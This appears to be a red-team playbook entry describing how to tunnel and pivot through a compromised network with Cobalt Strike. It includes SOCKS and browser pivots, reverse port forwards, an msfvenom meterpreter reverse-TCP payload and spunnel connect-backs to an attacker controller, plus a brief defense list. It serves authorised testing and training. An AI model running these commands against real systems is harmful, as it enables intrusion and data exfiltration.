---
id: d8fec46f-73af-4e9b-8b63-0381c1bf4a86
name: Establish-VPN-Like-Connection-and-Pivot-Using-Cobalt-Strike
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:16.588945+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tactics:
  - '[[tactics/Command and Control|TA0011 - Command and Control]]'
  - '[[tactics/Exfiltration|TA0010 - Exfiltration]]'
techniques:
  - >-
    [[techniques/Exfiltration Over Alternative Protocol|T1048 - Exfiltration
    Over Alternative Protocol]]
  - '[[techniques/Remote Access Tools|T1219 - Remote Access Tools]]'
sub_techniques: []
tags:
  - '[[tags/Cobalt Strike]]'
  - '[[tags/VPN & Pivots]]'
commands:
  - '[[commands/cobalt-strike-start-socks-server]]'
  - '[[commands/cobalt-strike-browser-pivot]]'
  - '[[commands/cobalt-strike-rportfwd]]'
  - '[[commands/cobalt-strike-spunnel]]'
  - '[[commands/cobalt-strike-spunnel-local]]'
platforms:
  - Windows
  - Linux
tools:
  - '[[tools/Cobalt-Strike]]'
validated: true
---

# Establish-VPN-Like-Connection-and-Pivot-Using-Cobalt-Strike

## Summary

This procedure uses Cobalt Strike's built-in features such as SOCKS proxy servers, browser pivoting, reverse port forwarding, and spunnel commands to create VPN-like tunnels and pivot through compromised networks. It enables red teams to simulate advanced persistent threats by tunneling traffic, proxying browser sessions, and establishing secure connections to bypass network segmentation and access internal resources.

## Description

In penetration testing and red team operations, gaining initial access to a target often requires methods to maintain connectivity and move laterally without direct exposure. Cobalt Strike excels in this by providing SOCKS servers for general traffic tunneling, browser pivots for web-based exploration through compromised hosts, and reverse port forwarding via rportfwd and spunnel for inbound connections. The spunnel command specifically spawns a new agent while creating a reverse tunnel, combining payload delivery with pivoting. This technique is ideal for environments with firewalls or NAT, allowing attackers to treat the compromised host as a gateway to deeper network segments. Success relies on an active Beacon session and proper configuration of the Cobalt Strike team server.

## Requirements

1. Active Cobalt Strike team server with listener configured.
2. Established Beacon implant on a compromised host with network access to the target segments.
3. Administrative or user-level privileges on the Beacon host for port binding.
4. Tools like Proxychains for client-side tunneling (on Kali Linux) and Metasploit for payload generation if using spunnel.
5. Knowledge of target network topology to select appropriate ports and hosts.

## Defense

- Implement network micro-segmentation to restrict lateral movement and monitor for anomalous port bindings or outbound connections.
- Enable endpoint detection and response (EDR) tools to flag unusual process spawning (e.g., spunnel agents) and PowerShell executions.
- Use application whitelisting to prevent unauthorized tools like Cobalt Strike Beacons from running.
- Monitor for SOCKS traffic patterns and unexpected reverse connections using network intrusion detection systems (NIDS).

## Objectives

1. Establish persistent tunneling for traffic proxying through the compromised host.
2. Enable browser-based pivoting to explore internal web resources without direct exposure.
3. Create reverse port forwards to access internal services from the attacker's machine.
4. Bypass firewall restrictions and network segmentation to reach sensitive internal assets.

## Instructions

### Step 1: Start SOCKS Server for Traffic Tunneling

**Context**: Begin by setting up a SOCKS proxy on the team server to route traffic through the Beacon, creating a VPN-like gateway. This allows tools like nmap or curl to pivot via the compromised host. Configure /etc/proxychains.conf on your attacking machine to point to the team server and port.

**Command** ([[commands/cobalt-strike-start-socks-server]]):
```bash
beacon > socks $_PORT
```

> This command starts a basic SOCKS4a server on the specified port. For SOCKS5 with authentication, use variations documented in the command. Expected output in the Beacon console: confirmation message like "SOCKS server started on port $_PORT". Verify by checking team server logs for active tunnels.

### Step 2: Set Up Browser Pivot for Web Traffic

**Context**: If the compromised host has an active Internet Explorer process, pivot browser traffic through it to access internal web apps. This is useful for enumerating intranet sites without installing additional proxies. Identify the IE process ID using tasklist or similar.

**Command** ([[commands/cobalt-strike-browser-pivot]]):
```bash
beacon > browserpivot $_PID $_ARCH
```

> Where $_ARCH is x86 or x64 matching the process. Expected output: "Browser pivot active" in the console. Success is confirmed when proxied browser requests (e.g., via Burp or manual IE) reach internal sites through the pivot.

### Step 3: Bind Reverse Port Forward for Inbound Connections

**Context**: Use rportfwd to listen on the Beacon host and forward connections to an internal target, allowing the attacker to connect to services behind NAT/firewalls. This is key for accessing databases or shares on internal hosts.

**Command** ([[commands/cobalt-strike-rportfwd]]):
```bash
beacon > rportfwd $_BIND_PORT $_FORWARD_HOST $_FORWARD_PORT
```

> Expected output: "Listening on port $_BIND_PORT". Test by connecting from the attacker machine (tunneled via SOCKS) to the bind port; traffic should forward to the internal host. If the port is in use, choose an available one.

### Step 4: Generate Payload for Spunnel if Needed

**Context**: For spunnel, first create a Metasploit payload if not already available. This step prepares a shellcode for spawning a new agent with reverse tunneling. Skip if using existing payloads.

**Command** ([[commands/metasploit-generate-reverse-tcp-payload]]):
```bash
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=127.0.0.1 LPORT=$_LPORT -f raw -o $_PAYLOAD_PATH
```

> Expected output: Binary file created at $_PAYLOAD_PATH. Verify file size and integrity before use.

### Step 5: Spawn Agent with Remote Reverse Port Forward

**Context**: Deploy spunnel to spawn a new agent on the target while creating a reverse tunnel directly to the controller. This combines initial access with pivoting, ideal for chaining compromises.

**Command** ([[commands/cobalt-strike-spunnel]]):
```bash
beacon > spunnel $_ARCH $_CONTROLLER_IP $_CONTROLLER_PORT $_PAYLOAD_PATH
```

> Expected output: New Beacon session established with tunnel active. Monitor team server for the connect-back.

### Step 6: Spawn Agent with Local Reverse Port Forward

**Context**: Use spunnel_local for tunneling through the Cobalt Strike client to a local handler (e.g., Metasploit). This is useful when direct controller access is blocked, routing via the existing Beacon.

**Command** ([[commands/cobalt-strike-spunnel-local]]):
```bash
beacon > spunnel_local $_ARCH $_LOCAL_IP $_LOCAL_PORT $_PAYLOAD_PATH
```

> Expected output: Tunnel established through client; handle connect-back on local MSF multi-handler. Success: New session in MSF console.
